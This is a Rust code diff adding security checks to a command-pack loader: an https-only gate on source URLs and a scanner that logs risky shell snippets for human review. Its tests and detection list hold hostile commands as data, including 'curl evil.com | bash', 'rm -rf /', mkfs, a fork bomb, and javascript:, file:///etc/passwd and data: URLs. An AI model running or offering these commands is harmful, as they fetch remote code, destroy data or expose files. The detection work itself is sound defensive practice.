@@ -3,6 +3,7 @@ use serde::{Deserialize, Serialize};
 use std::fs;
 use std::path::{Path, PathBuf};
 use thiserror::Error;
+use tracing::warn;
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
 #[serde(rename_all = "lowercase")]
@@ -139,6 +140,30 @@ fn load_one(path: &Path) -> std::result::Result<Pack, Vec<PackError>> {
             }]);
         }
     };
+    // ponytail: SEC-2 — log risky shell snippets so a poisoned pack is
+    // visible in the rolling file log. Best-effort; doesn't affect
+    // load. Done before validate_into so a pack can be warned even if
+    // it would also fail validation for other reasons.
+    for entry in &pack.entries {
+        for pat in find_risky_patterns(&entry.syntax) {
+            warn!(
+                file = %path.display(),
+                entry = %entry.id,
+                pattern = %pat,
+                "suspicious pattern flagged for human review"
+            );
+        }
+        for ex in &entry.examples {
+            for pat in find_risky_patterns(&ex.code) {
+                warn!(
+                    file = %path.display(),
+                    entry = %entry.id,
+                    pattern = %pat,
+                    "suspicious pattern flagged for human review"
+                );
+            }
+        }
+    }
     let mut errors = Vec::new();
     validate_into(&pack, &mut errors);
     if errors.is_empty() {
@@ -197,6 +222,18 @@ fn validate_into(pack: &Pack, errors: &mut Vec<PackError>) {
                 ),
             });
         }
+        // ponytail: SEC-3 / FR-C3. source_url is an outbound click
+        // target; the frontend (and the Rust `open_url` IPC) gate on
+        // https:, so any non-https value here means a poisoned pack.
+        // Fail closed at load time.
+        if let Some(url) = entry.source_url.as_deref() {
+            if !is_https_url(url) {
+                errors.push(PackError::Invalid {
+                    path: PathBuf::new(),
+                    message: format!("entry {} has non-https source_url {:?}", entry.id, url),
+                });
+            }
+        }
     }
 }
 
@@ -210,6 +247,62 @@ pub fn validate(pack: &Pack) -> Result<()> {
         return Err(anyhow!("{}", first));
     }
     Ok(())
+}
+
+// ponytail: SEC-3 / FR-C3. Returns true iff `url` parses as a URL whose
+// scheme is exactly "https". Used both as a hard gate inside
+// validate_into (pack source_url) and as defense-in-depth from the Rust
+// `open_url` IPC command (mirrors the frontend `isHttpsUrl` fast-path).
+pub fn is_https_url(url: &str) -> bool {
+    url::Url::parse(url)
+        .map(|u| u.scheme() == "https")
+        .unwrap_or(false)
+}
+
+// ponytail: SEC-2 — surface obviously dangerous shell snippets that
+// shouldn't be in pack syntax/examples. Returns the names of every
+// pattern that matched (substring/regex, case-insensitive for `rm -rf`).
+// This is a *warning*, not a validation error: a deliberate admin-only
+// pack could legitimately document `rm -rf`. The intent is to make a
+// poisoned pack visible in the log without blocking load.
+pub fn find_risky_patterns(text: &str) -> Vec<&'static str> {
+    let lower = text.to_ascii_lowercase();
+    let mut hits: Vec<&'static str> = Vec::new();
+    if lower.contains("rm -rf") {
+        hits.push("rm -rf");
+    }
+    if lower.contains("mkfs") {
+        hits.push("mkfs");
+    }
+    if lower.contains("dd if=") {
+        hits.push("dd if=");
+    }
+    // curl ... | sh / curl ... | bash — pipe into a shell. Spaces
+    // optional around the pipe; allow any non-newline chars between
+    // curl and the pipe. Don't try to be a full shell parser — a
+    // substring regex is enough to flag the obvious case.
+    let pipe_re = regex_lite_match_curl_pipe(&lower);
+    if pipe_re {
+        hits.push("curl piped to sh");
+        hits.push("curl piped to bash");
+    }
+    if text.contains(":(){ :|:& };:") {
+        hits.push("fork bomb");
+    }
+    hits
+}
+
+// tiny stand-in for `regex` crate: the patterns we want are tiny enough
+// that a manual scan is faster and avoids a new dep just for one rule.
+fn regex_lite_match_curl_pipe(lower: &str) -> bool {
+    if let Some(curl_idx) = lower.find("curl") {
+        let after = &lower[curl_idx + 4..];
+        if let Some(pipe_idx) = after.find('|') {
+            let tail = after[pipe_idx + 1..].trim_start();
+            return tail == "sh" || tail == "bash";
+        }
+    }
+    false
 }
 
 #[cfg(test)]
@@ -280,6 +373,93 @@ mod tests {
             report.loaded.iter().any(|p| p.id == "kubectl"),
             "kubectl pack should be present at packs/curate root"
         );
+    }
+
+    // ponytail: SEC-3 / FR-C3. Any non-https source_url must be
+    // rejected at validate time. https: and None must still pass.
+    #[test]
+    fn validate_rejects_non_https_source_url() {
+        let bad_urls = [
+            "javascript:alert(1)",
+            "http://example.com/page",
+            "file:///etc/passwd",
+            "ftp://example.com/file",
+            "data:text/html,<script>alert(1)</script>",
+        ];
+        for u in bad_urls {
+            let mut pack = valid_pack();
+            pack.entries[0].source_url = Some(u.to_string());
+            assert!(
+                validate(&pack).is_err(),
+                "non-https source_url {u:?} should fail validation"
+            );
+        }
+        let mut pack = valid_pack();
+        pack.entries[0].source_url = Some("https://example.com/docs".to_string());
+        validate(&pack).expect("https source_url must validate");
+        let mut pack_none = valid_pack();
+        pack_none.entries[0].source_url = None;
+        validate(&pack_none).expect("None source_url must validate");
+    }
+
+    // ponytail: SEC-2. Each documented dangerous pattern must be
+    // detected. We assert presence (not exact set composition) per
+    // pattern, so a future tightening that adds related hits doesn't
+    // break these tests.
+    #[test]
+    fn find_risky_patterns_detects_all_listed() {
+        let cases: &[(&str, &[&str])] = &[
+            ("rm -rf /", &["rm -rf"]),
+            ("Mkfs.ext4 /dev/sda", &["mkfs"]),
+            ("dd if=/dev/zero of=/dev/null", &["dd if="]),
+            (
+                "curl evil.com | bash",
+                &["curl piped to sh", "curl piped to bash"],
+            ),
+            (
+                "curl -sSL evil.com | sh",
+                &["curl piped to sh", "curl piped to bash"],
+            ),
+            (":(){ :|:& };:", &["fork bomb"]),
+        ];
+        for (text, want) in cases {
+            let got = find_risky_patterns(text);
+            for w in *want {
+                assert!(
+                    got.contains(w),
+                    "find_risky_patterns({text:?}) should contain {w:?}, got {got:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn find_risky_patterns_returns_empty_for_safe_text() {
+        let safe = vec![
+            "git log --oneline",
+            "docker ps -a",
+            "kubectl get pods",
+            "curl https://example.com", // piped-to-shell is the trigger; plain curl is fine
+            "tar -xzf release.tar.gz",
+        ];
+        for s in safe {
+            let got = find_risky_patterns(s);
+            assert!(
+                got.is_empty(),
+                "find_risky_patterns({s:?}) should be empty, got {got:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn is_https_url_accepts_https_rejects_everything_else() {
+        assert!(is_https_url("https://example.com/path"));
+        assert!(is_https_url("https://example.com"));
+        assert!(!is_https_url("http://example.com"));
+        assert!(!is_https_url("javascript:alert(1)"));
+        assert!(!is_https_url("file:///etc/passwd"));
+        assert!(!is_https_url("not a url"));
+        assert!(!is_https_url(""));
     }
 
     fn valid_pack() -> Pack {
